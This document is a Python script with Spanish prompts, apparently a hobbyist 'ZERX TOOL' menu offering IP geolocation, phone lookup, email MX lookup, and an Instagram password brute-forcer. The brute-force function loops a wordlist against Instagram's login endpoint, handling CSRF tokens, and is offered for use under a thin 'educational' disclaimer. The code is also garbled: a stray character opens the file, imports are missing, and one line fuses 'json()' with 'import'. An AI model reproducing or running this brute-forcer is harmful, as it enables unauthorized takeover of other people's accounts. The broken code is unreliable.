b

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""
███████╗███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗
█████╗  █████╗  ██████╔╝
██╔══╝  ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚═╝
ZERX TOOL
""")

def ip_tracker():
    ip = input("Ingrese la IP a rastrear: ").strip()
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()import
        if data['status'] == 'success':
            print(f"IP: {data['query']}")
            print(f"País: {data['country']}")
            print(f"Región: {data['regionName']}")
            print(f"Ciudad: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Latitud: {data['lat']}")
            print(f"Longitud: {data['lon']}")
        else:
            print("No se pudo obtener información para esa IP.")
    except Exception as e:
        print("Error al obtener información de la IP:", e)

def phone_info():
    phone = input("Ingrese el número telefónico con código de país (ejemplo +34123456789): ").strip()
    try:
        parsed = phonenumbers.parse(phone)
        print("Número válido:", phonenumbers.is_valid_number(parsed))
        print("Ubicación:", geocoder.description_for_number(parsed, "es"))
        print("Operador:", carrier.name_for_number(parsed, "es"))
        print("Tipo de número:", phonenumbers.number_type(parsed))
    except Exception as e:
        print("Error al obtener información del número:", e)

def insta_bruteforce():
    print("ATENCIÓN: Esta función es solo educativa. No intente usarla para actividades ilegales.")
    user = input("Usuario de Instagram: ").strip()
    wordlist_path = input("Ruta al archivo de contraseñas: ").strip()
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    })
    try:
        with open(wordlist_path, "r", encoding="utf-8") as f:
            passwords = f.read().splitlines()
    except Exception as e:
        print("Error al leer el archivo de contraseñas:", e)
        return
    for pwd in passwords:
        try:
            # Get CSRF token
            r1 = session.get("https://www.instagram.com/accounts/login/")
            csrf = r1.cookies.get_dict().get('csrftoken', '')
            session.headers.update({"X-CSRFToken": csrf})
            payload = {
                "username": user,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{pwd}",
                "queryParams": {},
                "optIntoOneTap": "false"
            }
            r2 = session.post(login_url, data=payload, allow_redirects=True)
            if r2.status_code == 200 and r2.json().get("authenticated"):
                print(f"Contraseña encontrada: {pwd}")
                return
            else:
                print(f"Probando contraseña: {pwd} - Fallido")
        except Exception as e:
            print("Error durante el intento:", e)
    print("No se encontró la contraseña en la lista.")

def email_info():
    email = input("Ingrese el correo electrónico: ").strip()
    domain = email.split('@')[-1]
    print(f"Dominio: {domain}")
    try:
        import dns.resolver
        records = dns.resolver.resolve(domain, 'MX')
        print("Registros MX:")
        for r in records:
            print(f" - {r.exchange}")
    except Exception:
        print("No se pudieron obtener registros MX o no está instalado dnspython.")
    # No se puede obtener más info sin APIs externas

def thanks_banner():
    print("""
████████╗ █████╗  ██████╗██╗  ██╗
╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ██║   ███████║██║     █████╔╝ 
   ██║   ██╔══██║██║     ██╔═██╗ 
   ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
Gracias por usar esta herramienta
""")

def main():
    while True:
        clear()
        banner()
        print("1. Rastrear una IP")
        print("2. Obtener información de un número telefónico")
        print("3. Ataque de fuerza bruta a Instagram (educativo)")
        print("4. Obtener información de un correo electrónico")
        print("5. Salir y mostrar agradecimiento")
        choice = input("Seleccione una opción (1-5): ").strip()
        if choice == '1':
            ip_tracker()
        elif choice == '2':
            phone_info()
        elif choice == '3':
            insta_bruteforce()
        elif choice == '4':
            email_info()
        elif choice == '5':
            thanks_banner()
            break
        else:
            print("Opción no válida.")
        input("\nPresione Enter para continuar...")

if __name__ == "__main__":
    try:
        import dns.resolver
    except ImportError:
        pass
    try:
        import phonenumbers
    except ImportError:
        print("Instale la librería phonenumbers para la opción 2: pip install phonenumbers")
    try:
        import requests
    except ImportError:
        print("Instale la librería requests para la opción 1 y 3: pip install requests")
    main()
